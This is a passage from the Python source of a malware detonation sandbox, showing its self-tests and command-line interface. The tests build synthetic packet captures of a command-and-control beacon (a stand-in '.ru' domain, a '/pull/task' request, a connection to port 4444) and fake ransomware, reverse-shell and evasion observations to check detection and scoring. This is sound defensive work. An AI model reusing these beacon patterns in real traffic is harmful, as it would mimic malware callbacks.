              "trace-derived facts are marked as runtime evidence")

        # a pcap holding one DNS question and one HTTP request
        pcap = os.path.join(tmp, "t.pcap")
        with open(pcap, "wb") as fh:
            fh.write(struct.pack("<IHHiIII", 0xA1B2C3D4, 2, 4, 0, 0, 65535, 1))

            def frame(payload):
                eth = b"\x52\x54\x00\x12\x34\x56\x52\x54\x00\x65\x43\x21\x08\x00"
                return eth + payload

            def ipv4(proto, l4, dst="198.51.100.7"):
                total = 20 + len(l4)
                hdr = (struct.pack(">BBHHHBBH", 0x45, 0, total, 1, 0, 64, proto, 0)
                       + socket.inet_aton("10.0.2.15") + socket.inet_aton(dst))
                return hdr + l4

            def write(pkt):
                fh.write(struct.pack("<IIII", 0, 0, len(pkt), len(pkt)) + pkt)

            dns = (struct.pack(">HHHHHH", 1, 0x0100, 1, 0, 0, 0)
                   + b"\x06beacon\x0acdn-update\x02ru\x00"
                   + struct.pack(">HH", 1, 1))
            write(frame(ipv4(17, struct.pack(">HHHH", 5300, 53,
                                             8 + len(dns), 0) + dns)))
            http = (b"GET /pull/task HTTP/1.1\r\nHost: beacon.cdn-update.ru\r\n"
                    b"User-Agent: Nyx/1.4\r\n\r\n")
            tcp = struct.pack(">HHIIBBHHH", 44001, 80, 0, 0, 0x50, 0x18,
                              0xFFFF, 0, 0) + http
            write(frame(ipv4(6, tcp)))
            syn = struct.pack(">HHIIBBHHH", 44002, 4444, 0, 0, 0x50, 0x02,
                              0xFFFF, 0, 0)
            write(frame(ipv4(6, syn, dst="203.0.113.9")))

        ptr = BehaviorTrace(sha256="p", chamber="qemu", fidelity=2)
        pkts = parse_pcap(pcap, ptr)
        check(pkts == 3, "all captured frames decoded (%d)" % pkts)
        check("beacon.cdn-update.ru" in ptr.values("net", "dns_query"),
              "DNS question recovered from the capture")
        check("Nyx/1.4" in ptr.values("net", "http_ua"),
              "User-Agent recovered from the capture")
        check("203.0.113.9:4444" in ptr.values("net", "connect"),
              "bare SYN recovered as a connection attempt")
        bad = os.path.join(tmp, "bad.pcap")
        with open(bad, "wb") as fh:
            fh.write(b"not a pcap at all, not even close")
        btr = BehaviorTrace(sha256="b")
        check(parse_pcap(bad, btr) == 0 and btr.errors,
              "a non-pcap file is reported, not parsed")
    finally:
        shutil.rmtree(tmp, ignore_errors=True)

    # -- 8. IOC safety -----------------------------------------------------
    print("\n8. IOC safety (the self-inflicted-outage guard)")
    safe = BehaviorTrace(sha256="x", chamber="jail", fidelity=1)
    safe.executed = True
    for addr in ("127.0.0.1:80", "10.0.2.3:53", "192.168.1.1:445",
                 "169.254.1.1:80", "172.16.31.9:22", "203.0.113.9:4444"):
        safe.add("net", "connect", "connect", live=True, value=addr)
    for host in ("localhost", "wpad", "sandbox.local", "10.99.99.99",
                 "beacon.cdn-update.ru"):
        safe.add("net", "dns_query", "resolved", live=True, value=host)
    safe.add("capability", "revshell", "reverse shell", live=True)
    r = assay(safe)
    ips = {v for (t, v, _vd, _n) in r.iocs if t == "ip"}
    doms = {v for (t, v, _vd, _n) in r.iocs if t == "domain"}
    check(r.verdict == "malware", "the sample is convicted, so IOCs are charged")
    check(ips == {"203.0.113.9"},
          "only the routable address became an IOC: %s" % sorted(ips))
    check(doms == {"beacon.cdn-update.ru"},
          "only the real hostname became an IOC: %s" % sorted(doms))
    check("127.0.0.1" not in ips and "10.99.99.99" not in doms,
          "the analysis network is never blocklisted")

    # a sample that is NOT convicted must not charge its embedded strings
    unconv = BehaviorTrace(sha256="y")
    unconv.add("net", "static_domain", "in bytes", value="updates.example-vendor.io")
    r2 = assay(unconv)
    check(all(vd == "unknown" for (_t, _v, vd, _n) in r2.iocs),
          "strings in an unconvicted sample are observed, not condemned")

    # -- 9. aggregates -----------------------------------------------------
    print("\n9. aggregate behaviour")
    agg = BehaviorTrace(sha256="z", chamber="jail", fidelity=1)
    agg.executed = True
    for i in range(MASS_WRITE_FILES + 2):
        agg.add("file", "write", "wrote", live=True, value="/home/u/doc%d.docx" % i)
    derive_aggregates(agg)
    check(agg.has("crypto", "mass_rewrite"),
          "%d file writes in one run is recognised as a mass rewrite"
          % (MASS_WRITE_FILES + 2))
    check(assay(agg).threat_name in ("MassFileRewrite", "Ransomware"),
          "mass rewrite is named as ransomware-shaped behaviour")
    few = BehaviorTrace(sha256="z2", chamber="jail", fidelity=1)
    for i in range(3):
        few.add("file", "write", "wrote", live=True, value="/tmp/f%d" % i)
    derive_aggregates(few)
    check(not few.has("crypto", "mass_rewrite"),
          "a handful of writes is not a mass rewrite")

    beacon = BehaviorTrace(sha256="z3", chamber="qemu", fidelity=2)
    beacon.executed = True
    for i in range(BEACON_MIN_REQUESTS):
        beacon.add("net", "http_request", "req %d" % i, live=True,
                   value="beacon.cdn-update.ru")
    # de-duplication keeps one observation per (kind, what, value), so repeated
    # contact has to be counted where it happens, not inferred afterwards.
    beacon.observations.extend([
        Observation("net", "http_request", "again", True,
                    "beacon.cdn-update.ru", SRC_RUNTIME)
        for _ in range(BEACON_MIN_REQUESTS)])
    derive_aggregates(beacon)
    check(beacon.has("net", "repeated_contact"),
          "repeated contact with one host is recognised as beaconing")

    # -- 9b. the signer's default construction -----------------------------
    # This is the path an appliance takes (no explicit key arguments) and the
    # one that shipped broken: the class referenced SEED_PATH/PUB_PATH while
    # those lived in another module, so VerdictSigner() raised NameError while
    # every test passed explicit paths and stayed green.
    # -- 8b. silence from a live chamber must not clear an executable ------
    #
    # A class of bug that had no test at all: the guard against clearing an
    # executable was gated on `tr.fidelity == 0`, so ANY chamber with fidelity
    # > 0 switched it off -- including one that observed nothing, and one that
    # failed outright, because the chambers build their trace with
    # fidelity=self.fidelity before any error return.
    print("\n8b. an uninformative run cannot clear an executable")
    quiet_pe = build_test_pe({"kernel32.dll": ["ExitProcess", "GetStdHandle"]})

    def _live(fidelity, chamber, *, executed=True, obs=(), errors=()):
        tr = BehaviorTrace(sha256="silence", chamber=chamber, fidelity=fidelity)
        dissect(quiet_pe, tr)
        tr.executed = executed
        for kind, what in obs:
            tr.add(kind, what, "synthetic", live=True)
        tr.errors.extend(errors)
        derive_aggregates(tr)
        return tr, assay(tr)

    _tr, r0 = _live(0, "static", executed=False)
    check(r0.verdict == "unknown",
          "static-only on a quiet PE is unknown (%s)" % r0.verdict)

    tr1, r1 = _live(1, "jail")
    check(r1.verdict == "unknown",
          "a JAIL run that observed nothing is unknown, not benign (%s) -- "
          "this was live on Linux" % r1.verdict)
    check(not tr1.conclusive(), "and the trace reports itself inconclusive")
    check("observed nothing at run time" in r1.reasons[-1],
          "with a reason naming the evasive shape")

    _tr, r2 = _live(2, "qemu")
    check(r2.verdict == "unknown",
          "a GUEST run that observed nothing is unknown, not benign (%s)"
          % r2.verdict)

    _tr, r3 = _live(2, "qemu", executed=False,
                    errors=["guest agent never reported in"])
    check(r3.verdict == "unknown",
          "a FAILED chamber is unknown, not benign (%s)" % r3.verdict)
    check("did not complete" in r3.reasons[-1],
          "and blames the chamber, not the sample")

    # The promise in docs/crucible-guest-image.md, which was false as coded.
    _tr, r4 = _live(2, "qemu", obs=[("error", "no_agent")])
    check(r4.verdict == "unknown",
          "an error observation alone also blocks a clean verdict (%s)"
          % r4.verdict)

    # A conclusive run CAN clear it, or nothing would ever be benign.
    tr5, r5 = _live(1, "jail", obs=[("process", "exec"), ("process", "exited")])
    check(r5.verdict == "benign" and tr5.conclusive(),
          "a run that DID observe behaviour can still clear it (%s)"
          % r5.verdict)

    print("\n8c. evasion is scored, and only as far as it should be")
    ev = BehaviorTrace(sha256="evasive", chamber="qemu", fidelity=2)
    dissect(quiet_pe, ev)
    ev.executed = True
    for what in ("evade_vm", "evade_dbg", "evade_sleep", "guest_hung"):
        ev.add("evade", what, "probed for analysis", live=True)
    derive_aggregates(ev)
    rev = assay(ev)
    check(rev.verdict != "benign",
          "a sample that only probed for a sandbox is not benign (%s)"
          % rev.verdict)
    check(rev.verdict == "grayware",
          "it is grayware, NOT malware: hiding from us is not proof of malice, "
          "and a conviction would blocklist its hash off the back of it (%s/%d)"
          % (rev.verdict, rev.score))
    check(rev.score < SCORE_MALWARE,
          "the evasion cap_group holds it under the conviction line (%d < %d)"
          % (rev.score, SCORE_MALWARE))
    check(any(n.startswith("Evasive.") for (n, _w, _b, _y) in rev.matched),
          "and an Evasive.* rule is named in the report")

    print("\n8d. Windows persistence and the ransomware threshold")
    wp = BehaviorTrace(sha256="winpersist", chamber="qemu", fidelity=2)
    wp.executed = True
    _classify_path(WIN_STARTUP_PATH, wp)
    check(wp.has("persist", "persist_startup"),
          "a Startup-folder write is recognised (PERSIST_PATHS was all POSIX)")
    _classify_path(WIN_RUNKEY_PATH, wp)
    check(wp.has("persist", "persist_reg"), "a Run-key write is recognised")

    one = BehaviorTrace(sha256="oneenc", chamber="qemu", fidelity=2)
    one.executed = True
    one.add("crypto", "ransom_extension", "one file", live=True,
            value="/backup/old.enc")
    derive_aggregates(one)
    r_one = assay(one)
    check(r_one.verdict != "malware",
          "ONE ransom-suffixed file is not a conviction (%s/%d) -- that token "
          "is emitted per file, so a stray backup artefact used to convict "
          "at 95" % (r_one.verdict, r_one.score))

    many = BehaviorTrace(sha256="manyenc", chamber="qemu", fidelity=2)
    many.executed = True
    for i in range(RANSOM_SPREAD_FILES + 1):
        many.add("crypto", "ransom_extension", "encrypted", live=True,
                 value="/home/u/doc%d.enc" % i)
    derive_aggregates(many)
    r_many = assay(many)
    check(many.has("crypto", "ransom_spread"),
          "%d of them is a spread" % (RANSOM_SPREAD_FILES + 1))
    check(r_many.verdict == "malware" and r_many.threat_name == "Ransomware",
          "and THAT convicts as ransomware (%s/%s)"
          % (r_many.verdict, r_many.threat_name))

    print("\n9a. the signature type is always available")
    check(ContentSignature is not None,
          "ContentSignature resolves whether or not inline_payload_det is "
          "deployed (its absence silently disables signature generation)")
    probe = ContentSignature(sid=1, name="probe", pattern=b"abcdefgh",
                             nocase=True, action=ACTION_RESET,
                             severity="high", threat_name="T",
                             verdict="malware", source="crucible")
    check(probe.region_window(64) == (0, 64),
          "and it implements region_window, which the rule compiler calls")
    check(probe.pattern == b"abcdefgh" and probe.action == ACTION_RESET,
          "and it round-trips the fields the compiler reads")

    print("\n9b. verdict signer defaults")
    try:
        default_signer = VerdictSigner()
        check(True, "VerdictSigner() constructs with default key paths")
        check(isinstance(default_signer.seed_path, str)
              and default_signer.seed_path.endswith(".key"),
              "its default seed path names a file: %s"
              % default_signer.seed_path)
        check(default_signer.can_sign() in (True, False),
              "can_sign() answers without raising when no key is installed")
        check(default_signer.key_id() == "" or len(default_signer.key_id()) == 16,
              "key_id() is empty or 16 hex chars")
        # An unsigned bundle must be marked, never silently passed off as valid.
        bundle = default_signer.sign({"sha256": "0" * 64, "verdict": "malware",
                                      "score": 90})
        if not default_signer.can_sign():
            check(bundle["sig"] == "" and bundle["sig_alg"] == "none",
                  "with no seed installed the bundle is marked unsigned")
            check(not VerdictSigner.verify(bundle, b"\x01" * 32),
                  "and no verifier accepts it")
    except Exception as e:
        check(False, "VerdictSigner() raised %r" % e)

    # -- 10. chambers and the engine ---------------------------------------
    print("\n10. chambers and the engine")
    eng = CrucibleSandbox(policy=POLICY_BEST)
    for st in eng.statuses():
        print("      %s" % st.line())
    check(any(st.name == "static" and st.available for st in eng.statuses()),
          "the static chamber is always available")
    check(all(isinstance(st.reason, str) and st.reason
              for st in eng.statuses()),
          "every chamber states its availability reason")

    static_only = CrucibleSandbox(policy=POLICY_STATIC)
    check(all(not c.executes for c in static_only.chambers),
          "the default policy builds no executing chamber")

    rep = static_only.analyze(hashlib.sha256(docx).hexdigest(), docx,
                              {"filename": "invoice.docx"})
    check(rep.verdict == "malware" and rep.threat_name == "MacroDropper",
          "engine report: %s/%s score=%d" % (rep.verdict, rep.threat_name,
                                             rep.score))
    for attr in ("sha256", "verdict", "score", "threat_name", "file_type",
                 "signatures", "iocs", "details", "backend"):
        if not hasattr(rep, attr):
            check(False, "report is missing %s" % attr)
    check(json.loads(rep.to_json())["verdict"] == "malware",
          "the report serialises to JSON")
    check(rep.details.get("chamber") == "static"
          and rep.details.get("confidence") in ("low", "medium", "high"),
          "the report says which chamber ran and how confident it is")
    check(isinstance(rep.details.get("reasons"), list) and rep.details["reasons"],
          "the report carries the operator-facing reasoning")

    # -- tally -------------------------------------------------------------
    print()
    if failures:
        print("FAILED %d check(s):" % len(failures))
        for f in failures:
            print("  - %s" % f)
        return 1
    print("all crucible selftests passed")
    return 0


# ===========================================================================
# CLI
# ===========================================================================
def _read_sample(path: str) -> bytes:
    with open(path, "rb") as fh:
        return fh.read(MAX_SAMPLE)


def _print_trace(tr: BehaviorTrace) -> None:
    print("chamber   : %s (fidelity %d)%s" %
          (tr.chamber, tr.fidelity, "  EXECUTED" if tr.executed else ""))
    print("file type : %s   size: %d   run: %.2fs" %
          (tr.file_type or "unknown", tr.size, tr.duration))
    print("observations:")
    for o in tr.observations:
        mark = {SRC_RUNTIME: "*", SRC_CONTENT: "+", SRC_IMPORT: "-"}.get(o.source, " ")
        print("  %s %-9s %-20s %s" % (mark, o.kind, o.what,
                                      (o.value or o.detail)[:64]))
    if tr.dropped:
        print("dropped:")
        for d in tr.dropped:
            print("  %-40s %8d  %s" % (d["name"][:40], d["size"], d["type"]))
    if tr.errors:
        print("errors:")
        for e in tr.errors:
            print("  %s" % e)
    print("  legend: * observed by execution   + asserted by content"
          "   - inferred from imports")


def main(argv=None) -> int:
    ap = argparse.ArgumentParser(
        prog="ffn_crucible.py",
        description="FFN Crucible: unknown-object detonation engine")
    ap.add_argument("--debug", action="store_true")
    sub = ap.add_subparsers(dest="cmd")

    sub.add_parser("selftest", help="hermetic self-test; executes nothing")
    sub.add_parser("chambers", help="what this box can actually run")

    p = sub.add_parser("dissect", help="static dissection only")
    p.add_argument("file")

    p = sub.add_parser("detonate", help="run the best available chamber")
    p.add_argument("file")
    p.add_argument("--chamber", choices=("static", "jail", "qemu"))
    p.add_argument("--timeout", type=int, default=DEFAULT_TIMEOUT)
    p.add_argument("--guests", default=DEFAULT_GUEST_PROFILES)

    p = sub.add_parser("assay", help="full pipeline: detonate then judge")
    p.add_argument("file")
    p.add_argument("--policy", choices=POLICIES, default=POLICY_STATIC)
    p.add_argument("--timeout", type=int, default=DEFAULT_TIMEOUT)
    p.add_argument("--guests", default=DEFAULT_GUEST_PROFILES)
    p.add_argument("--json", action="store_true")

    p = sub.add_parser("sinkhole", help="run the capture sinkhole on its own")
    p.add_argument("--bind", default="127.0.0.1")
    p.add_argument("--sink-ip", default="10.99.99.99")
    p.add_argument("--dns-port", type=int, default=0)
    p.add_argument("--http-port", type=int, default=0)
    p.add_argument("--tls-port", type=int, default=0)

    # Not user-facing: JailChamber re-invokes this module inside the namespaces.
    p = sub.add_parser("_jail-runner")
    p.add_argument("--sample", required=True)
    p.add_argument("--scratch", required=True)
    p.add_argument("--events", required=True)
    p.add_argument("--timeout", type=int, default=DEFAULT_TIMEOUT)
    p.add_argument("--strace")
    p.add_argument("--jail-root")

    args = ap.parse_args(argv)
    logging.basicConfig(
        level=logging.DEBUG if args.debug else logging.INFO,
        format="%(levelname)s %(name)s: %(message)s")

    if args.cmd == "selftest":
        return selftest()

    if args.cmd == "_jail-runner":
        return _jail_runner(args)

    if args.cmd == "chambers":
        eng = CrucibleSandbox(policy=POLICY_BEST)
        print("crucible chambers on this host:")
        for st in eng.statuses():
            print("  " + st.line())
        live = [st for st in eng.statuses() if st.available and st.executes]
        print("\nhighest available fidelity: %d%s" %
              (max([st.fidelity for st in eng.statuses() if st.available],
                   default=0),
               "" if live else "  (nothing here can execute a sample)"))
        return 0

    if args.cmd == "sinkhole":
        sink = Sinkhole(bind=args.bind, sink_ip=args.sink_ip,
                        dns_port=args.dns_port, http_port=args.http_port,
                        tls_port=args.tls_port)
        ports = sink.start()
        print("sinkhole listening: %s  (answering every name with %s)"
              % (ports, args.sink_ip))
        print("Ctrl-C to stop")
        try:
            while True:
                time.sleep(1)
                while sink.events:
                    print("  %s" % json.dumps(sink.events.pop(0)))
        except KeyboardInterrupt:
            pass
        finally:
            sink.stop()
        return 0

    if args.cmd == "dissect":
        data = _read_sample(args.file)
        tr = StaticChamber().run(hashlib.sha256(data).hexdigest(), data, {})
        derive_aggregates(tr)
        _print_trace(tr)
        print()
        print(assay(tr).explain())
        return 0

    if args.cmd == "detonate":
        data = _read_sample(args.file)
        sha = hashlib.sha256(data).hexdigest()
        chambers = {"static": StaticChamber(),
                    "jail": JailChamber(),
                    "qemu": QemuChamber(profile_path=args.guests)}
        if args.chamber:
            ch = chambers[args.chamber]
            st = ch.status()
            if not st.available:
                print("chamber %s is unavailable: %s" % (ch.name, st.reason))
                return 2
            tr = ch.run(sha, data, {"filename": os.path.basename(args.file)},
                        timeout=args.timeout)
        else:
            eng = CrucibleSandbox(policy=POLICY_BEST, timeout=args.timeout,
                                  guest_profiles=args.guests)
            tr = eng.detonate(sha, data, {"filename": os.path.basename(args.file)})
        derive_aggregates(tr)
        _print_trace(tr)
        print()
        print(assay(tr).explain())
        return 0

    if args.cmd == "assay":
        data = _read_sample(args.file)
        eng = CrucibleSandbox(policy=args.policy, timeout=args.timeout,
                              guest_profiles=args.guests)
        rep = eng.analyze(hashlib.sha256(data).hexdigest(), data,
                          {"filename": os.path.basename(args.file)})
        if args.json:
            print(rep.to_json())
        else:
            print("%s  %s" % (rep.sha256[:16], os.path.basename(args.file)))
            print("verdict   : %s  score=%d  %s" %
                  (rep.verdict.upper(), rep.score, rep.threat_name or "-"))
            print("chamber   : %s (fidelity %s, confidence %s)" %
                  (rep.details.get("chamber"), rep.details.get("fidelity"),
                   rep.details.get("confidence")))
            for reason in rep.details.get("reasons", []):
                print("  - %s" % reason)
            if rep.iocs:
                print("iocs:")
                for (t, v, vd, nm) in rep.iocs[:20]:
                    print("  %-7s %-48s %-8s %s" % (t, v[:48], vd, nm))
            if rep.signatures:
                print("generated signatures:")
                for sig in rep.signatures:
                    print("  %-28s %s" % (sig.name,
                                          sig.pattern.decode("utf-8", "replace")[:44]))
        return 0 if rep.verdict != "error" else 1

    ap.print_help()
    return 0


if __name__ == "__main__":
    sys.exit(main())
